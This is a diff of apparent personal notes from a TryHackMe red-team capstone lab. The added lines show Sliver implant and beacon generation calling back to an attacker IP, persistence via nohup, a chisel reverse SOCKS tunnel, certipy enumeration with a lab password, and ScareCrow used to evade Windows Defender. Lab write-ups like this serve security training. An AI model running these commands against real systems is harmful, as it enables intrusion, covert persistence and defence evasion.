@@ -254,6 +254,8 @@ WE ARE MOHAMMAD - rdp access finally!!!
 ![](wehaveping.png)
 Then the machine shutdown.
 
+## Perimeter Breach
+
 Then al finds cmd injection
 ![](alhappywecansleeptheserver.png)
 
@@ -287,19 +289,47 @@ sudo cp authorized_keys /root/.ssh/authorized_keys
 
 Went on a bit of tangent with how Proxychains works; SSH tunnel - but we are on a multi-hacker network so everyone using ssh is a really danger.
 
-![](vpnarpcache.png)
-
 ```bash
 cat vpn-interal-thm-free-packed-lunch-in-the-lands.nmap | grep 'scan report' | awk '{print $6}' | tr -d '()' > ~/RedTeamCapStoneChallenge/internalHosts.txt
+# Local network information
+route
+arp -a
 ```
 
-Proxychains
+![](vpnarpcache.png)
+
+Persistence just in case of other people using the same vectors
+```go
+// For VPN
+generate --mtls 10.50.99.131:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
+generate beacon --mtls 10.50.99.131:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
+mtls -L 10.50.99.131 -l 11011
+mtls -L 10.50.99.131 -l 11012
+// Drop on VPN
+nohup ./VPN-update &
+nohup ./VPN-upgrade &
+```
+
+Setup up chisel server to handle a Dynamic Reverse Proxy 
+```bash
+./chisel server -host 10.50.99.131 -p 20000 --reverse --socks5 -v
+# On the VPN
+nohup ./chisel client 10.50.99.131:20000  R:20001:socks &
+# comment sock4 ... and add to /etc/proxychains4.conf:
+socks5  127.0.0.1 20001
+```
+
+Proxychains and chisel proof
+![](proxychainandchiselsetupcomplete.png)
+
+lisa.moore credentials have been 
+![](passwordchangeon103.png)
 
 Crackmap Exec
 
 Certipy - 101 with Al
 ```bash
-proxychains certipy find -u 'lisa.moore' -p 'Scientist2006' -dc-ip 10.200.113.102
+proxychains certipy-ad find -u 'lisa.moore' -p 'Scientist2006' -dc-ip 10.200.113.102
 ```
 
 Web Enrollment is web-based builtin interface to enrollment, which uses ntlm authentication.
@@ -309,9 +339,31 @@ Look at Enrollment Rights
 
 If we have get SYSTEM access on Server 1 then we DC because of the Enrollment rights.
 
-Bloodhound run with --tcp-dns uses dns over tcp which works better over proxychains
+add CORPDC to /etc/hosts
 
-## Perimeter Breach
+Shakestech recommends [https://github.com/iphelix/dnschef](https://github.com/iphelix/dnschef)
+
+Bloodhound run with `--dns-tcp` uses dns over tcp which works better over `proxychains`, but this did not work for Al. 
+```go
+generate beacon --mtls 10.50.99.131:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
+// ScareCrow to bypass Windows Defender - shoot fly with bozaka
+./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
+// Deploy implant
+
+// Run .NET assembly in its own process - without a beacon object file!
+execute-assembley -i 
+```
+
+
+
+Download with `Google Chrome` from RDP session
+
+Covenant is .Net framework meaning that if we unhook AMSI Windows Defender is bypassed from then on
+
+SharpHound.ps1 works
+
+
+
 ## Initial Compromise of Active Directory
 ## Full Compromise of CORP Domain
 ## Full Compromise of Parent Domain
